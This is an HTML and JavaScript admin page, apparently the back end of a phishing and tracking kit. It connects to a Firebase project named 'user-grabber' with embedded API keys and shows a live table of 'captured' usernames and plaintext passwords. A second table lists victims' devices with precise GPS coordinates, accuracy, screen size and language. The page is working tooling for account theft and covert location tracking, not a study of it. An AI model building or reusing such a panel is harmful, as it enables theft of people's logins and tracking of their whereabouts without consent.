<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin – Credentials & Device Logs</title>
  
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

  <style>
    body {
      font-family: system-ui, -apple-system, sans-serif;
      background: #f8f9fa;
      margin: 0;
      padding: 20px 15px;
      color: #222;
    }
    h1 { text-align: center; color: #1a1a1a; margin-bottom: 8px; }
    .subtitle { text-align: center; color: #666; margin-bottom: 30px; }

    .warning {
      background: #fff3cd;
      color: #664d03;
      padding: 14px;
      border-radius: 6px;
      margin: 0 auto 25px;
      max-width: 700px;
      text-align: center;
      font-size: 0.95rem;
    }

    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 30px;
      max-width: 1600px;
      margin: 0 auto;
    }

    @media (max-width: 1100px) {
      .grid { grid-template-columns: 1fr; }
    }

    .section {
      background: white;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
      overflow: hidden;
    }

    .section h2 {
      background: #0d6efd;
      color: white;
      margin: 0;
      padding: 14px 18px;
      font-size: 1.15rem;
    }

    table {
      width: 100%;
      border-collapse: collapse;
    }

    th, td {
      padding: 12px 14px;
      text-align: left;
      border-bottom: 1px solid #eee;
    }

    th {
      background: #f1f3f5;
      color: #444;
      font-weight: 600;
      font-size: 0.92rem;
    }

    tr:hover {
      background: #f8fbff;
    }

    .timestamp {
      white-space: nowrap;
      font-size: 0.88rem;
      color: #555;
    }

    .username { font-weight: 500; }
    .password { color: #c92a2a; font-weight: 500; }
    .ua { font-size: 0.86rem; color: #555; max-width: 320px; overflow: hidden; text-overflow: ellipsis; }
    .location { font-size: 0.9rem; }

    .no-data {
      text-align: center;
      padding: 60px 20px;
      color: #888;
      font-style: italic;
    }
  </style>
</head>
<body>

<div class="warning">
  <strong>Security notice:</strong> This page belongs to Sharoon.
</div>

<h1>Captured Data Overview</h1>
<p class="subtitle">Credentials (left) • Device & Location Logs (right)</p>

<div class="grid">

  <!-- LEFT: Credentials -->
  <div class="section">
    <h2>Credentials / Login Attempts</h2>
    <table>
      <thead>
        <tr>
          <th>Time</th>
          <th>Username / Email / Phone</th>
          <th>Password</th>
          <th>User Agent (short)</th>
        </tr>
      </thead>
      <tbody id="credBody"></tbody>
    </table>
  </div>

  <!-- RIGHT: Mobile Users / Devices -->
  <div class="section">
    <h2>Mobile Users / Devices & Location</h2>
    <table>
      <thead>
        <tr>
          <th>Time</th>
          <th>Device</th>
          <th>Location</th>
          <th>User Agent (short)</th>
          <th>Extra</th>
        </tr>
      </thead>
      <tbody id="deviceBody"></tbody>
    </table>
  </div>

</div>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
    authDomain: "user-grabber.firebaseapp.com",
    projectId: "user-grabber",
    databaseURL: "https://user-grabber-default-rtdb.asia-southeast1.firebasedatabase.app",
    storageBucket: "user-grabber.firebasestorage.app",
    messagingSenderId: "1004415300770",
    appId: "1:1004415300770:web:46aeef2b3a35d95ac193fb"
  };

  let db;
  try {
    firebase.initializeApp(firebaseConfig);
    db = firebase.database();
  } catch (e) {
    console.error("Firebase failed", e);
    document.body.innerHTML += '<p style="color:red;text-align:center">Firebase connection error – check console</p>';
  }

  function formatTime(ts) {
    if (!ts) return "—";
    return new Date(ts).toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
      dateStyle: 'medium',
      timeStyle: 'short'
    });
  }

  function loadCredentials() {
    const tbody = document.getElementById('credBody');
    tbody.innerHTML = '<tr><td colspan="4" class="no-data">Loading...</td></tr>';

    db.ref('credentials').orderByChild('timestamp').on('value', snap => {
      tbody.innerHTML = '';
      if (!snap.exists()) {
        tbody.innerHTML = '<tr><td colspan="4" class="no-data">No credentials yet</td></tr>';
        return;
      }

      const entries = [];
      snap.forEach(child => {
        entries.push({ key: child.key, ...child.val() });
      });

      // Newest first
      entries.sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));

      entries.forEach(entry => {
        const row = document.createElement('tr');
        row.innerHTML = `
          <td class="timestamp">${formatTime(entry.timestamp || entry.capturedAt)}</td>
          <td class="username">${entry.username || '—'}</td>
          <td class="password">${entry.password || '—'}</td>
          <td class="ua" title="${entry.userAgent || ''}">${(entry.userAgent || '—').substring(0,70)}${(entry.userAgent||'').length > 70 ? '…' : ''}</td>
        `;
        tbody.appendChild(row);
      });
    });
  }

 function loadDevices() {
  const tbody = document.getElementById('deviceBody');
  tbody.innerHTML = '<tr><td colspan="5" class="no-data">Loading...</td></tr>';

  db.ref('mobile_users').on('value', snap => {
    tbody.innerHTML = '';
    if (!snap.exists()) {
      tbody.innerHTML = '<tr><td colspan="5" class="no-data">No device logs yet</td></tr>';
      return;
    }

    const entries = [];
    snap.forEach(child => {
      entries.push({ key: child.key, ...child.val() });
    });

    // Try to find any timestamp-like field
    entries.sort((a, b) => {
      const getTime = obj => 
        obj.timestamp || 
        obj.capturedAt || 
        obj.time || 
        obj.createdAt || 
        obj.date || 
        0;  // fallback to 0 if nothing found
      
      return getTime(b) - getTime(a); // newest first
    });

    entries.forEach(entry => {
      // More flexible time detection
      let rawTime = entry.timestamp || 
                    entry.capturedAt || 
                    entry.time || 
                    entry.createdAt || 
                    entry.date;

      const displayTime = rawTime 
        ? (typeof rawTime === 'number' 
            ? new Date(rawTime).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', dateStyle: 'medium', timeStyle: 'short' })
            : rawTime.includes('T')  // ISO string
              ? new Date(rawTime).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', dateStyle: 'medium', timeStyle: 'short' })
              : rawTime)  // already formatted string
        : "— (no time saved)";

      const loc = entry.lat && entry.lng
        ? `${entry.lat.toFixed(5)}, ${entry.lng.toFixed(5)} (±${entry.accuracy || '?'}m)`
        : (entry.location_error || entry.last_error || '—');

      const extra = [
        entry.screen ? `Screen: ${entry.screen}` : '',
        entry.language ? `Lang: ${entry.language}` : '',
        entry.device ? `Dev: ${entry.device}` : '',
        entry.location_trigger ? `Trig: ${entry.location_trigger}` : ''
      ].filter(Boolean).join(' • ');

      const row = document.createElement('tr');
      row.innerHTML = `
        <td class="timestamp">${displayTime}</td>
        <td>${entry.device || '—'}</td>
        <td class="location">${loc}</td>
        <td class="ua" title="${entry.userAgent || ''}">${(entry.userAgent || '—').substring(0,70)}${(entry.userAgent||'').length > 70 ? '…' : ''}</td>
        <td style="font-size:0.88rem;">${extra || '—'}</td>
      `;
      tbody.appendChild(row);
    });
  });
}
  window.addEventListener('DOMContentLoaded', () => {
    if (db) {
      loadCredentials();
      loadDevices();
    }
  });
</script>
</body>
</html>
